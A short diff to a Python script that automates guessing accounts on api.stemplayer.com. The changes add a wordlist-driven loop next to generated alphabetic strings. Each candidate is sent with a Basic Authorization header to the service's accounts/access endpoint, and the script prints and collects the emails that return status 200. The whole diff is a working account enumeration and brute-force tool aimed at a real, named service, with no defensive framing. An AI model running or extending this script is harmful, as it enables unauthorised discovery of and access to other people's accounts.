@@ -7,6 +7,7 @@ import itertools
 range_list = list(range(0, 16))
 character_list = list(string.ascii_lowercase)
 number_list = list(range(0, 99))
+wordlist = open("wordlist.txt","r").read().split("\n")
 
 emails = []
 
@@ -27,10 +28,13 @@ def test(test_email):
 		headers = {
 			'Authorization': 'Basic ' + authorization
 		}
-		r = requests.get('https://api.stemplayer.com/accounts/access', headers=headers)
+		r = requests.get("https://api.stemplayer.com/accounts/access", headers=headers)
 		if r.status_code == 200:
 			print(email)
 			emails.append(email)
+
+for x in wordlist:
+		test(x)
 
 for x in generate("abcdefghijklmnopqrstuvwxyz"):
 		test(''.join(x))
